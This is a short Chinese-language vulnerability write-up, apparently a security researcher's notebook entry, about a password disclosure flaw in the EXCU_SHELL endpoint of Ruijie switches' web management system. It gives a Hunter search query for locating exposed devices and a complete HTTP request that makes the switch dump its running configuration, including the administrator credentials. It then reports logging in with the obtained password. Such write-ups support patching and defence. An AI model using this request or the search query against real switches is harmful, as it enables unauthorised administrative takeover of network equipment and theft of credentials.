# 锐捷交换机WEB管理系统EXCU_SHELL密码信息泄漏漏洞

# 一、漏洞简介
<font style="color:rgb(31, 35, 40);">锐捷交换机 WEB 管理系统 EXCU_SHELL存在密码信息泄露漏洞，攻击者可从漏洞获取到管理员账号密码，从而以管理员权限登录。</font>

# 二、影响版本
+ <font style="color:rgb(31, 35, 40);">锐捷交换机 WEB 管理系统</font>

# <font style="color:rgb(31, 35, 40);">三、资产测绘</font>
+ hunter`web.body="img/free_login_ge.gif"&&web.body="./img/login_bg.gif"`
+ 登录页面

![1693030700475-392f4913-2fd5-45e8-a33b-c5eb742be387.png](./img/HsfISm4uJkaUTn7g/1693030700475-392f4913-2fd5-45e8-a33b-c5eb742be387-471626.png)

# 四、漏洞复现
```plain
GET /EXCU_SHELL HTTP/1.1
Cmdnum: 1
Command1: show running-config
Confirm1: n
User-Agent: Java/1.8.0_381
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```

![1693030750176-4431bab4-1796-4604-a4e5-40c3f8bb5936.png](./img/HsfISm4uJkaUTn7g/1693030750176-4431bab4-1796-4604-a4e5-40c3f8bb5936-223418.png)

使用获取的账号密码成功登录系统

![1693030780834-da105fd0-c0a5-483f-a016-d1a47499cc5e.png](./img/HsfISm4uJkaUTn7g/1693030780834-da105fd0-c0a5-483f-a016-d1a47499cc5e-719318.png)



> 更新: 2024-06-24 11:42:27  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/hzkmpfxiryxd4dnp>